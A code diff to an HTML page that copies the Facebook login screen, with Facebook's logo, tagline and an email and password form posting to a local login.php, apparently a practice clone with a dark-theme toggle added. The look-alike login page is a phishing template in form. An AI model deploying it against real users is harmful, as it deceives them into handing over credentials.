@@ -1,37 +1,55 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Facebook Sign in/Sign up</title>
-    <link rel="stylesheet" href="style.css">
-</head>
-<body>
-            <div class="section-1">
-                <div class="logo">
-                    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo">
-                </div>
-                <div class="logo-para">
-                     <p>Facebook helps you connect and share with the people in your life.</p>
-                </div>
-            </div>
-        <div class="section-2">
-            <div class="form-container">
-                <form action="login.php" method="post">
-                    <input type="email" name="email" placeholder="Email address or phone number" required>
-                    <input type="password" name="password" placeholder="Password" required>
-                    <button type="submit">Log in</button>
-                </form>
-                <div class="forgot-password">
-                    <a href="#">Forgotten password?</a>
-                </div>
-                <div class="create-account">
-                    <a href="#">Create new account</a>
-                </div>
-            </div>
-            <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
-            
-            </div>
-      
-</body>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="section-1">
+      <div class="container">
+        <button class="themebtn" id="themebtn">Dark Theme</button>
+      </div>
+      <div class="logo">
+        <img
+          src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
+          alt="Facebook Logo"
+        />
+      </div>
+      <div class="logo-para">
+        <p>
+          Facebook helps you connect and share with the people in your life.
+        </p>
+      </div>
+    </div>
+    <div class="section-2">
+      <div class="form-container">
+        <form action="login.php" method="post">
+          <input
+            type="email"
+            name="email"
+            placeholder="Email address or phone number"
+            required
+          />
+          <input
+            type="password"
+            name="password"
+            placeholder="Password"
+            required
+          />
+          <button type="submit">Log in</button>
+        </form>
+        <div class="forgot-password">
+          <a href="#">Forgotten password?</a>
+        </div>
+        <div class="create-account">
+          <a href="#">Create new account</a>
+        </div>
+      </div>
+      <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+    </div>
+
+    <script src="script.js"></script>
+  </body>
 </html>
